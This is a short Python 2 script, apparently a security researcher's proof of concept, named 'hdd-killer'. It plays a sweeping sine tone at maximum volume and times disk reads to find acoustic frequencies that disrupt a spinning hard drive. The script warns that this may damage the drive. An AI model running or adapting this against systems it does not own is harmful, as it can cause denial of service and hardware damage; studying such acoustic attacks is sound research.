"""PyAudio hdd-killer: Generate sound and interfere with HDD """
"""Alfredo Ortega @ortegaalfredo"""
"""Usage: hdd-killer /dev/sdX"""
"""Where /dev/sdX is a spinning hard-disk drive"""
"""Turn the volume to the max for better results"""
"""Requires: pyaudio. Install with 'sudo pip install pyaudio' or 'sudo apt-get install python-pyaudio'"""

import pyaudio
import time
import sys
import math
import random

RATE=48000
FREQ=50

# validation. If a disk hasn't been specified, exit.
if len(sys.argv) < 2:
    print "hdd-killer: Attempt to interfere with a hard disk, using sound.\n\n" +\
	  "The disk will be opened as read-only.\n" + \
          "Warning: It might cause damage to HDD.\n" +\
          "Usage: %s /dev/sdX" % sys.argv[0]
    sys.exit(-1)

# instantiate PyAudio (1)
p = pyaudio.PyAudio()
x1=0
NEWFREQ=FREQ

# define audio synt callback (2)
def callback(in_data, frame_count, time_info, status):
    global x1,FREQ,NEWFREQ
    data=''
    sample=0
    for x in xrange(frame_count):
        oldsample=sample
        sample=chr(int(math.sin(x1*((2*math.pi)/(RATE/FREQ)))*127)+128)
        data = data+sample
        # continous frequency change
        if (NEWFREQ!=FREQ) and (sample==chr(128)) and (oldsample<sample) :
                FREQ=NEWFREQ
                x1=0
        x1+=1
    return (data, pyaudio.paContinue)

# open stream using callback (3)
stream = p.open(format=pyaudio.paUInt8,
                channels=1,
                rate=RATE,
                output=True,
                stream_callback=callback)

# start the stream (4)
stream.start_stream()

# wait for stream to finish (5)
while stream.is_active():
    timeprom=0
    c=file(sys.argv[1])
    for i in xrange(20):
        a=time.clock()
        c.seek(random.randint(0,1000000000),1) #attempt to bypass file buffer
        c.read(51200)
        b=time.clock()
        timeprom+=b-a
    c.close()
    timeprom/=20
    print("Frequency: %.2f Hz File Read prom: %f us" % (FREQ,timeprom*1000000))
    NEWFREQ+=0.5

# stop stream (6)
stream.stop_stream()
stream.close()

# close PyAudio (7)
p.terminate()

